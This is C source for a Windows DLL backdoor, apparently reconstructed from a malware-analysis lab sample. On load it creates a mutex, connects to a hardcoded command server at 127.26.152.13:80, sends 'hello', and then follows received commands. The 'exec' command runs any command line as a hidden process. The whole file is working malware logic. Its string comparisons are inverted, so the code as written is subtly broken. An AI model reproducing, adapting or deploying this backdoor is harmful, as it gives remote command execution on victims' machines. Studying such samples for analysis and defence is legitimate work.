
#include <winsock2.h>
#include <windows.h>

char* mutexName = "SADFHUHF";
char* ipStr = "127.26.152.13";
short port = 80;
char* notify = "hello";

BOOL sub_10001010(DWORD fdwReason){
	
	WSADATA wsaData;
	char buf[4096];
	SOCKET sock = 0;
	struct sockaddr_in name;
	BOOL startup = FALSE;
	STARTUPINFOA startupInfo;
	if (fdwReason != DLL_PROCESS_ATTACH){
		goto epilog;
	}
	HANDLE hMutex;
	hMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, mutexName);
	if (hMutex){
		goto epilog;
	}
	hMutex = CreateMutex(NULL, FALSE, mutexName);
	// singleton 
	if (WSAStartup(0x202, &wsaData) != 0){
		goto epilog;
	}
	startup = TRUE;
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET){
		goto epilog;
	}
	name.sin_family = AF_INET;
	name.sin_addr.s_addr = inet_addr(ipStr);
	name.sin_port = htons(port);
	
	if (connect(sock, (struct sockaddr*)&name, sizeof(struct sockaddr_in)) == SOCKET_ERROR){
		goto epilog;
	}
	if (send(sock, notify, strlen(notify) + 1, 0) == SOCKET_ERROR){
		goto epilog;
	}
	if (shutdown(sock, SD_SEND) == SOCKET_ERROR){
		goto epilog;
	}
	while(recv(sock, buf, sizeof(buf), 0) != SOCKET_ERROR){
		if (strncmp("sleep", buf, 5)){
			Sleep(0x60000);
			continue;
		}
		if (strncmp("exec", buf , 4)){
			memset(&startupInfo, 0, sizeof(STARTUPINFOA));
			startupInfo.cb = sizeof(STARTUPINFOA);
			// startupInfo.hStdOutput = startupInfo.hStdError = sock; (shutdown was called though)		
			CreateProcessA(NULL, buf + 5, NULL, NULL, TRUE, 
				CREATE_NO_WINDOW, NULL, NULL, &startupInfo, NULL);
		}
		
		if (buf[0] == 'q'){
			goto epilog;
		}
	}
	
	epilog:
	if (startup){
		WSACleanup();
	}
	if (sock && sock != INVALID_SOCKET){
		closesocket(sock);
	}
	return 0;
	
}

BOOL DllMain(HANDLE hInstDll, DWORD fdwReason, LPVOID lpReserved){
	// NOTE: THIS IS NOT A ONE TO ONE TRANSLATION 
	// CODE WAS CHANGED TO FIT CORRECT API USAGE 
	// AND TO LOOK MORE INTUITIVE 
	
	switch (fdwReason){
		//TODO: fix this switch
		case DLL_THREAD_ATTACH:
		case DLL_PROCESS_ATTACH: {
			// CreateThread(NULL, 0, sub_10001010, (LPVOID)fdwReason, 0, NULL);
			sub_10001010(fdwReason);
			return TRUE;
		}
		default:
		return TRUE;
		
	}
}